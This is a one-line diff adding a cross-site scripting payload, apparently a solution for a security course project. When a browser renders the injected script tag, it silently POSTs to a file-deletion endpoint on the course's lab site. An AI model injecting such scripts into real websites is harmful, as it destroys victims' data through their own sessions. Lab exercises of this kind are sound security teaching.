@@ -1,0 +1,1 @@
+<script>fetch("https://proj3.cs161.org/site/deleteFiles",{method:"POST"})</script>
